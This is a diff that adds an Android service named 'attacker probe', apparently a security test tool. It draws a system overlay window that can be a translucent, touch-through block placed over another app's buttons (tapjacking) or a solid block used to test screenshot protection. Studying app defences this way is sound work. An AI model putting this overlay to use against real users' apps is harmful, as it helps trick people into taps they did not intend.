@@ -1,0 +1,43 @@
+package probe.attacker;
+import android.app.*;
+import android.content.Intent;
+import android.content.pm.ServiceInfo;
+import android.graphics.Color;
+import android.graphics.PixelFormat;
+import android.os.IBinder;
+import android.util.Log;
+import android.view.Gravity;
+import android.view.View;
+import android.view.WindowManager;
+
+/** mode=cover: translucent, touch-through overlay above the victim's buttons (tapjacking). mode=magenta[-secure]: solid magenta block for screenshot test. */
+public class Overlay extends Service {
+    private View root;
+    @Override public IBinder onBind(Intent i) { return null; }
+    @Override public int onStartCommand(Intent intent, int flags, int id) {
+        NotificationChannel ch = new NotificationChannel("p", "p", NotificationManager.IMPORTANCE_LOW);
+        getSystemService(NotificationManager.class).createNotificationChannel(ch);
+        Notification n = new Notification.Builder(this, "p").setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle("attacker probe").build();
+        startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
+        if (root != null) return START_NOT_STICKY;
+        String mode = intent == null ? "cover" : String.valueOf(intent.getStringExtra("mode"));
+        float alpha = intent == null ? 0.5f : intent.getFloatExtra("alpha", 0.5f);
+        View v = new View(this);
+        int fl = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
+        int w = 700, h = 700, y = 200;
+        if (mode.startsWith("cover")) {
+            v.setBackgroundColor(Color.argb((int) (alpha * 255), 255, 0, 0));
+            fl |= WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
+        } else {
+            v.setBackgroundColor(Color.rgb(255, 0, 255));
+            if (mode.endsWith("secure")) fl |= WindowManager.LayoutParams.FLAG_SECURE;
+            w = 400; h = 400; y = 900;
+        }
+        WindowManager.LayoutParams p = new WindowManager.LayoutParams(w, h, WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY, fl, PixelFormat.TRANSLUCENT);
+        p.gravity = Gravity.TOP | Gravity.CENTER_HORIZONTAL; p.y = y; p.alpha = mode.startsWith("cover") ? 1f : 1f;
+        root = v; getSystemService(WindowManager.class).addView(root, p);
+        Log.i("PROBE", "attacker overlay mode=" + mode + " alpha=" + alpha);
+        return START_NOT_STICKY;
+    }
+    @Override public void onDestroy() { if (root != null) getSystemService(WindowManager.class).removeView(root); root = null; super.onDestroy(); }
+}
